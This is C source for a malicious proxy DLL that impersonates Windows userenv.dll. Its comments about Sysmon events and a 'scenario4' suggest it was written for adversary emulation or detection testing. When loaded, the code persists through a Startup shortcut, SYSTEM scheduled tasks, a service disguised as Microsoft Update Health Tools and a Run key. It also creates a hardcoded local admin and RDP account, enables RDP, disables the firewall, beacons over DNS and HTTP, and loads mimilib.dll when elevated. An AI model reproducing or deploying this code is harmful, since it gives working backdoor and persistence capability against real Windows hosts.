#include <windows.h>
#include <stdio.h>
#include <stdarg.h>
#include <tlhelp32.h>
#define SECURITY_WIN32
#include <secext.h>
#include <shlobj.h>
#include <shobjidl.h>
#include <objbase.h>
#include <oleauto.h>
#define COBJMACROS
#include <taskschd.h>
#include <urlmon.h>

#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "secur32.lib")

static const char *g_msra_dir = "C:\\Users\\Public\\Libraries";
static const char *g_enum     = "C:\\ProgramData\\Microsoft\\Search\\Data\\EDS\\index.tmp";
static const char *g_ipfile   = "C:\\Windows\\Temp\\ip.tmp";
static const char *g_tag      = "userenv_proxy.dll";

/* ponytail: enumeration config - fixed creds (task said fixed), beacon URL
   reuses the scenario4 repo raw path already pulled elsewhere (blends with
   existing GET traffic, no 404 noise). */
static const char *g_enum_user  = "support";
static const char *g_enum_pass  = "P@ssw0rd!23";
static const char *g_beacon_url = "https://github.com/Justanother-engineer/scenario4/raw/refs/heads/main/payload.zip";

static HMODULE g_real = NULL;
static HANDLE g_workerGuard = NULL;

/* ponytail: centralized activity.log on the operator's Desktop (shared with
   loader.ps1 / elevcheck.exe / P0wershell.exe). */
static void activity(const char *fmt, ...) {
    char path[MAX_PATH];
    if (FAILED(SHGetFolderPathA(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, path))) return;
    lstrcatA(path, "\\activity.log");
    FILE *f = fopen(path, "a");
    if (!f) return;
    SYSTEMTIME st; GetLocalTime(&st);
    fprintf(f, "[%04u-%02u-%02u %02u:%02u:%02u] [%s] ", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond, g_tag);
    va_list ap; va_start(ap, fmt); vfprintf(f, fmt, ap); va_end(ap);
    fputc('\n', f);
    fclose(f);
}

static BOOL ensure_real(void) {
    if (!g_real)
        g_real = LoadLibraryA("C:\\Windows\\System32\\userenv.dll");
    return g_real != NULL;
}

#define WRAP(ret, name, args, call) \
    ret WINAPI name args { \
        if (!ensure_real()) return 0; \
        typedef ret (WINAPI *fn) args; \
        static fn f = NULL; \
        if (!f) f = (fn)GetProcAddress(g_real, #name); \
        return f ? f call : (ret)0; \
    }

WRAP(BOOL, CreateEnvironmentBlock, (LPVOID *lpEnv, HANDLE hToken, BOOL bInherit), (lpEnv, hToken, bInherit))
WRAP(BOOL, DestroyEnvironmentBlock, (LPVOID lpEnv), (lpEnv))
WRAP(BOOL, ExpandEnvironmentStringsForUserW, (HANDLE hToken, LPCWSTR lpSrc, LPWSTR lpDst, DWORD dwSize), (hToken, lpSrc, lpDst, dwSize))
WRAP(BOOL, GetAllUsersProfileDirectoryA, (LPSTR lpProfileDir, LPDWORD lpcchSize), (lpProfileDir, lpcchSize))
WRAP(BOOL, GetAllUsersProfileDirectoryW, (LPWSTR lpProfileDir, LPDWORD lpcchSize), (lpProfileDir, lpcchSize))
WRAP(BOOL, GetDefaultUserProfileDirectoryA, (LPSTR lpProfileDir, LPDWORD lpcchSize), (lpProfileDir, lpcchSize))
WRAP(BOOL, GetDefaultUserProfileDirectoryW, (LPWSTR lpProfileDir, LPDWORD lpcchSize), (lpProfileDir, lpcchSize))
WRAP(BOOL, GetProfilesDirectoryA, (LPSTR lpProfileDir, LPDWORD lpcchSize), (lpProfileDir, lpcchSize))
WRAP(BOOL, GetProfilesDirectoryW, (LPWSTR lpProfileDir, LPDWORD lpcchSize), (lpProfileDir, lpcchSize))
WRAP(BOOL, GetProfileType, (DWORD *pdwFlags), (pdwFlags))
WRAP(BOOL, GetUserProfileDirectoryA, (HANDLE hToken, LPSTR lpProfileDir, LPDWORD lpcchSize), (hToken, lpProfileDir, lpcchSize))
WRAP(BOOL, GetUserProfileDirectoryW, (HANDLE hToken, LPWSTR lpProfileDir, LPDWORD lpcchSize), (hToken, lpProfileDir, lpcchSize))
WRAP(BOOL, LoadUserProfileA, (HANDLE hToken, void *lpProfileInfo), (hToken, lpProfileInfo))
WRAP(BOOL, LoadUserProfileW, (HANDLE hToken, void *lpProfileInfo), (hToken, lpProfileInfo))
WRAP(BOOL, UnloadUserProfile, (HANDLE hToken, HANDLE hProfile), (hToken, hProfile))
WRAP(BOOL, CreateProfile, (PCWSTR pszUserSid, PCWSTR pszUserName, PWSTR pszProfilePath, DWORD cchProfilePath), (pszUserSid, pszUserName, pszProfilePath, cchProfilePath))
WRAP(BOOL, DeleteProfileA, (PCSTR lpSidString, PCSTR lpProfilePath, PCSTR lpComputerName), (lpSidString, lpProfilePath, lpComputerName))
WRAP(BOOL, DeleteProfileW, (PCWSTR lpSidString, PCWSTR lpProfilePath, PCWSTR lpComputerName), (lpSidString, lpProfilePath, lpComputerName))


static void create_lnk(void) {
    char lnkPath[MAX_PATH], target[MAX_PATH];
    wsprintfA(target, "%s\\msra.exe", g_msra_dir);
    lstrcpynA(lnkPath, "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\msra.lnk", MAX_PATH);

    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA(lnkPath, &fd);
    if (h != INVALID_HANDLE_VALUE) { FindClose(h); activity("[+] .lnk already exists: %s", lnkPath); return; }

    IShellLinkA *sl = NULL;
    IPersistFile *pf = NULL;
    if (FAILED(CoCreateInstance(&CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, &IID_IShellLinkA, (void**)&sl))) {
        activity("[-] CoCreateInstance CLSID_ShellLink failed"); return;
    }
    sl->lpVtbl->SetPath(sl, target);
    sl->lpVtbl->SetWorkingDirectory(sl, g_msra_dir);
    sl->lpVtbl->SetDescription(sl, "System Maintenance");
    if (FAILED(sl->lpVtbl->QueryInterface(sl, &IID_IPersistFile, (void**)&pf))) {
        activity("[-] QueryInterface IPersistFile failed"); sl->lpVtbl->Release(sl); return;
    }
    WCHAR wpath[MAX_PATH];
    MultiByteToWideChar(CP_ACP, 0, lnkPath, -1, wpath, MAX_PATH);
    HRESULT hr = pf->lpVtbl->Save(pf, wpath, TRUE);
    if (SUCCEEDED(hr)) activity("[+] .lnk created: %s -> %s", lnkPath, target);
    else activity("[-] .lnk Save failed (0x%lx)", hr);
    pf->lpVtbl->Release(pf);
    sl->lpVtbl->Release(sl);
}

/* ponytail: generic bounded process launcher for the no-console host.
   Direct CreateProcessA of the target, stdio redirected to \\.\NUL via
   STARTUPINFO handles. Bounded WaitForSingleObject so a hung child can't
   stall the worker thread forever. */
static int run_exe(const char *cmdline, DWORD timeoutMs) {
    HANDLE nulW = CreateFileA("\\\\.\\NUL", GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE,
                              NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    HANDLE nulR = CreateFileA("\\\\.\\NUL", GENERIC_READ,  FILE_SHARE_READ|FILE_SHARE_WRITE,
                              NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    STARTUPINFOA si;    memset(&si, 0, sizeof(si)); si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = nulW; si.hStdError = nulW; si.hStdInput = nulR;
    PROCESS_INFORMATION pi; memset(&pi, 0, sizeof(pi));

    char buf[MAX_PATH * 6];
    lstrcpynA(buf, cmdline, sizeof(buf));
    if (!CreateProcessA(NULL, buf, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        if (nulW) CloseHandle(nulW);
        if (nulR) CloseHandle(nulR);
        return -1;
    }
    WaitForSingleObject(pi.hProcess, timeoutMs);
    DWORD code = STILL_ACTIVE;
    GetExitCodeProcess(pi.hProcess, &code);
    if (code == STILL_ACTIVE) TerminateProcess(pi.hProcess, 1);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    if (nulW) CloseHandle(nulW);
    if (nulR) CloseHandle(nulR);
    return (int)code;
}

static void create_task_govinda(void) {
    char taskPath[MAX_PATH];
    wsprintfA(taskPath, "%s\\msra.exe", g_msra_dir);

    char q[MAX_PATH * 2];
    wsprintfA(q, "schtasks.exe /query /tn GOVINDA");
    if (run_exe(q, 10000) == 0) { activity("[+] GOVINDA task already exists"); return; }

    /* ponytail: /ru SYSTEM skips the interactive password prompt that
       /rl highest (no /ru) hits and hangs in a non-interactive session. */
    char c[MAX_PATH * 4];
    wsprintfA(c, "schtasks.exe /create /tn GOVINDA /tr \"%s\" /ru SYSTEM /sc onlogon /f", taskPath);
    activity("[+] Creating GOVINDA task (schtasks.exe)");
    if (run_exe(c, 30000) == 0) activity("[+] GOVINDA task created (ru=SYSTEM, onlogon)");
    else activity("[-] GOVINDA task creation failed");
}

/* ponytail: Orion via the Task Scheduler 2.0 COM API (RegisterTask with an
   inline XML definition). RegisterTask swallows the trigger/action/principal
   objects in one shot. */
static void create_task_orion(void) {
    char taskPath[MAX_PATH];
    wsprintfA(taskPath, "%s\\msra.exe", g_msra_dir);

    char xml[1024];
    wsprintfA(xml,
        "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">"
        "<Principals><Principal id=\"LocalSystem\"><UserId>S-1-5-18</UserId>"
        "<RunLevel>HighestAvailable</RunLevel></Principal></Principals>"
        "<Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers>"
        "<Settings><Enabled>true</Enabled><Hidden>false</Hidden>"
        "<ExecutionTimeLimit>PT0S</ExecutionTimeLimit><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>"
        "<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries></Settings>"
        "<Actions Context=\"Author\"><Exec><Command>%s</Command></Exec></Actions></Task>",
        taskPath);

    ITaskService *svc = NULL;
    HRESULT hr = CoCreateInstance(&CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER,
                                  &IID_ITaskService, (void**)&svc);
    if (FAILED(hr)) { activity("[-] CoCreateInstance TaskScheduler failed (0x%lx)", hr); return; }

    VARIANT v; VariantInit(&v);
    hr = ITaskService_Connect(svc, v, v, v, v);
    if (FAILED(hr)) { activity("[-] ITaskService::Connect failed (0x%lx)", hr); ITaskService_Release(svc); return; }

    ITaskFolder *root = NULL;
    hr = ITaskService_GetFolder(svc, SysAllocString(L"\\"), &root);
    if (FAILED(hr) || !root) { activity("[-] GetFolder(\\) failed (0x%lx)", hr); ITaskService_Release(svc); return; }

    VARIANT vUser;    VariantInit(&vUser);    vUser.vt = VT_BSTR; vUser.bstrVal = SysAllocString(L"SYSTEM");
    VARIANT vPass;    VariantInit(&vPass);
    VARIANT vSddl;    VariantInit(&vSddl);

    IRegisteredTask *reg = NULL;
    BSTR bName = SysAllocString(L"Orion");
    int xmlWlen = MultiByteToWideChar(CP_UTF8, 0, xml, -1, NULL, 0);
    BSTR bXml  = SysAllocStringLen(NULL, xmlWlen);
    if (bXml) MultiByteToWideChar(CP_UTF8, 0, xml, -1, bXml, xmlWlen);

    hr = ITaskFolder_RegisterTask(root, bName, bXml, TASK_CREATE_OR_UPDATE,
                                  vUser, vPass, TASK_LOGON_SERVICE_ACCOUNT, vSddl, &reg);
    if (SUCCEEDED(hr)) activity("[+] Orion task created (Task Scheduler COM API, ru=SYSTEM)");
    else                activity("[-] RegisterTask Orion failed (0x%lx)", hr);

    if (reg)   IRegisteredTask_Release(reg);
    SysFreeString(bName);
    SysFreeString(bXml);
    VariantClear(&vUser);
    ITaskFolder_Release(root);
    ITaskService_Release(svc);
}

/* ponytail: sc.exe create -> Sysmon/Winlogbeat 7045 service-install noise. */
static void create_service(void) {
    char c[MAX_PATH * 4];
    wsprintfA(c, "cmd.exe /c sc.exe create WinUpdHlth binPath= \"%s\\msra.exe\" DisplayName= \"Microsoft Update Health Tools\" start= auto", g_msra_dir);
    activity("[+] Creating service WinUpdHlth (sc.exe)");
    if (run_exe(c, 30000) == 0) activity("[+] WinUpdHlth service created (EID 7045)");
    else activity("[-] WinUpdHlth service creation failed");
}

/* ponytail: host enumeration + persistence hardening. Collects user/host/IP,
   creates a local admin + RDP account (fixed creds), enables RDP, disables
   the firewall, writes it all to index.tmp, beacons DNS 3x + github 5x.
   Best-effort throughout: a failed step is logged + skipped. */
static void enumerate_host(void) {
    HRESULT hr;
    char userBuf[256];  DWORD userLen = sizeof(userBuf);
    char hostBuf[256];  DWORD hostLen = sizeof(hostBuf);
    char ipBuf[64];     ipBuf[0] = 0;

    if (!GetUserNameExA(NameSamCompatible, userBuf, &userLen)) {
        lstrcpynA(userBuf, "unknown", sizeof(userBuf));
        activity("[-] GetUserNameEx failed (%lu)", GetLastError());
    } else activity("[+] Enumerate: user=%s", userBuf);

    if (!GetComputerNameExA(ComputerNameNetBIOS, hostBuf, &hostLen)) {
        lstrcpynA(hostBuf, "unknown", sizeof(hostBuf));
        activity("[-] GetComputerNameEx failed (%lu)", GetLastError());
    } else activity("[+] Enumerate: host=%s", hostBuf);

    DeleteFileA(g_ipfile);
    char curlCmd[MAX_PATH * 4];
    wsprintfA(curlCmd, "cmd.exe /c curl.exe -s --max-time 5 https://ifconfig.me > \"%s\"", g_ipfile);
    int irc = run_exe(curlCmd, 10000);
    FILE *f = fopen(g_ipfile, "r");
    if (f) {
        if (fgets(ipBuf, sizeof(ipBuf), f)) {
            char *nl = strchr(ipBuf, '\n'); if (nl) *nl = 0;
            char *cr = strchr(ipBuf, '\r'); if (cr) *cr = 0;
            activity("[+] Enumerate: public IP=%s", ipBuf);
        }
        fclose(f);
        DeleteFileA(g_ipfile);
    }
    if (!ipBuf[0]) {
        lstrcpynA(ipBuf, "unreachable", sizeof(ipBuf));
        activity("[-] Public IP fetch failed (curl rc=%d)", irc);
    }

    char netUser[256], netAdmin[256], netRdp[256];
    wsprintfA(netUser,  "cmd.exe /c net.exe user %s %s /add", g_enum_user, g_enum_pass);
    wsprintfA(netAdmin, "cmd.exe /c net.exe localgroup Administrators %s /add", g_enum_user);
    wsprintfA(netRdp,   "cmd.exe /c net.exe localgroup \"Remote Desktop Users\" %s /add", g_enum_user);

    activity("[+] Enumerate: creating user %s", g_enum_user);
    if (run_exe(netUser, 30000) == 0) activity("[+] Enumerate: net user /add ok");
    else activity("[-] Enumerate: net user /add failed (exists?)");
    if (run_exe(netAdmin, 30000) == 0) activity("[+] Enumerate: added to Administrators");
    else activity("[-] Enumerate: localgroup Administrators /add failed");
    if (run_exe(netRdp, 30000) == 0) activity("[+] Enumerate: added to Remote Desktop Users");
    else activity("[-] Enumerate: localgroup \"Remote Desktop Users\" /add failed");

    /* RDP enable -> EID 13 registry write */
    char rdpCmd[512];
    lstrcpynA(rdpCmd, "cmd.exe /c reg.exe add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f", sizeof(rdpCmd));
    BOOL rdpOn = (run_exe(rdpCmd, 15000) == 0);
    if (rdpOn) activity("[+] Enumerate: RDP enabled (fDenyTSConnections=0)");
    else activity("[-] Enumerate: RDP enable failed");

    /* HKCU Run key -> EID 13 (persistence noise) */
    char runCmd[MAX_PATH * 2];
    wsprintfA(runCmd, "cmd.exe /c reg.exe add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v OneDriveSync /t REG_SZ /d \"%s\\msra.exe\" /f", g_msra_dir);
    if (run_exe(runCmd, 15000) == 0) activity("[+] Enumerate: HKCU Run\\OneDriveSync = %s\\msra.exe", g_msra_dir);
    else activity("[-] Enumerate: Run key write failed");

    char netshCmd[256];
    lstrcpynA(netshCmd, "cmd.exe /c netsh.exe advfirewall set allprofiles state off", sizeof(netshCmd));
    BOOL fwOff = (run_exe(netshCmd, 30000) == 0);
    if (fwOff) activity("[+] Enumerate: firewall disabled");
    else       activity("[-] Enumerate: firewall disable failed");

    /* DNS beacon 3x -> Sysmon EID 22 */
    for (int i = 1; i <= 3; i++) {
        char ns[160];
        wsprintfA(ns, "cmd.exe /c nslookup.exe ms%d-s1-s2-s3.github.com >nul 2>&1", i);
        run_exe(ns, 15000);
        activity("[+] Enumerate: DNS beacon %d/3 sent", i);
    }

    /* HTTP beacon github raw URL 5x, 2s between each */
    int ok = 0;
    for (int i = 1; i <= 5; i++) {
        hr = URLDownloadToFileA(NULL, g_beacon_url, "\\\\.\\NUL", 0, NULL);
        if (hr == S_OK) { ok++; activity("[+] beacon %d/5 ok", i); }
        else            { activity("[-] beacon %d/5 failed (0x%lx)", i, hr); }
        if (i < 5) Sleep(2000);
    }
    activity("[+] Enumerate: beacons sent %d/5", ok);

    /* Write enum summary to index.tmp in the search index dir */
    FILE *ef = fopen(g_enum, "w");
    if (ef) {
        fprintf(ef, "Username=%s\n", userBuf);
        fprintf(ef, "Hostname=%s\n", hostBuf);
        fprintf(ef, "PublicIP=%s\n", ipBuf);
        fprintf(ef, "NewAccount=%s\n", g_enum_user);
        fprintf(ef, "Password=%s\n", g_enum_pass);
        fprintf(ef, "FirewallDisabled=%s\n", fwOff ? "true" : "false");
        fprintf(ef, "RdpEnabled=%s\n", rdpOn ? "true" : "false");
        fprintf(ef, "BeaconResult=sent %d/5\n", ok);
        fclose(ef);
        activity("[+] index.tmp written -> %s", g_enum);
    } else {
        activity("[-] Cannot write %s", g_enum);
    }
}

static DWORD WINAPI worker_thread(LPVOID lp) {
    activity("[+] Worker thread started (scenario-4 v4: + activity.log, scatter, service, RDP, DNS beacon)");
    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    /* ponytail: pump messages so COM (Task Scheduler API) doesn't deadlock
       inside this STA thread. */
    MSG msg;
    PeekMessage(&msg, NULL, 0, 0, PM_NOREMOVE);

    create_lnk();
    create_task_govinda();
    create_task_orion();
    create_service();
    enumerate_host();

    activity("[+] Worker thread completed");
    CoUninitialize();
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        {
            char host[MAX_PATH];
            DWORD hlen = GetModuleFileNameA(NULL, host, MAX_PATH);
            activity("[+] userenv.dll DLL_PROCESS_ATTACH host=%s", hlen ? host : "?");
        }
        /* ponytail: named-mutex -> single worker per boot. Only the first
           acquirer runs the worker; others early-return. */
        g_workerGuard = CreateMutexA(NULL, TRUE, "Local\\scenario4_worker_v1");
        if (g_workerGuard && GetLastError() == ERROR_ALREADY_EXISTS) {
            CloseHandle(g_workerGuard); g_workerGuard = NULL;
            activity("[*] userenv.dll loaded but worker mutex already held (single worker per boot)");
            return TRUE;
        }
        BOOL elevated = FALSE;
        HANDLE hToken;
        if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
            TOKEN_ELEVATION te;
            DWORD size = sizeof(te);
            if (GetTokenInformation(hToken, TokenElevation, &te, sizeof(te), &size))
                elevated = te.TokenIsElevated;
            CloseHandle(hToken);
        }
        if (elevated)
            LoadLibraryA("C:\\Windows\\System32\\mimilib.dll");
        CloseHandle(CreateThread(NULL, 0, worker_thread, NULL, 0, NULL));
    }
    return TRUE;
}
